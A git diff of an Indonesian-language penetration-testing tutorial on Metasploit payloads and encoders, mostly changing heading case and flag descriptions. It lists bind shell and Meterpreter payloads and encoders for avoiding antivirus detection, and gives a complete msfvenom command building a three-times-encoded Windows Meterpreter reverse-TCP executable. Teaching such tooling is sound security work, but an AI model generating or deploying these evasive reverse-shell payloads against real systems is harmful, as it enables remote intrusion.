@@ -11,7 +11,7 @@ Payload adalah kode yang dijalankan di sistem target setelah berhasil dieksploit
 - **Bind Shell** (membuka port di target untuk diakses attacker)
 - **Meterpreter** (payload canggih Metasploit dengan banyak fitur)
 
-Contoh Payload Populer:
+Contoh payload populer:
 
 | Payload |	Keterangan |
 |:--:|:--:|
@@ -28,7 +28,7 @@ Encoder adalah teknik untuk menyandikan payload agar tidak terdeteksi oleh antiv
 - Menghindari deteksi signature oleh antivirus.
 - Menyesuaikan dengan karakterisasi buffer (misal: tidak boleh ada `\x00`).
 
-Contoh Encoder:
+Contoh encoder:
 
 | Encoder	| Platform | Deskripsi |
 |:--:|:--:|:--:|
@@ -36,7 +36,7 @@ Contoh Encoder:
 | `cmd/echo` | `Windows` | Menyandikan payload sebagai perintah echo |
 | `generic/none` | `All` | Tidak menggunakan encoding |
 
-Contoh Penggunaan Encoder:
+Contoh penggunaan encoder:
 
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o shell_encoded.exe
@@ -46,8 +46,8 @@ Keterangan:
 - `-p`: Jenis payload: `windows/meterpreter/reverse_tcp`
 - `LHOST`: IP Attacker: `192.168.1.8`
 - `LPORT`: Port listener: `4444`
-- `-e`: Encoder (contoh: `x86/shikata_ga_nai`)
-- `-i`: Iterasi encoder (semakin banyak, semakin acak tapi bisa tidak stabil)
+- `-e`: Encoder: `x86/shikata_ga_nai`
+- `-i`: Iterasi encoder: `3`
 - `-f`: Format payload: `exe`
 - `-o`: Nama file hasil payload: `shell_encoded.exe`
 
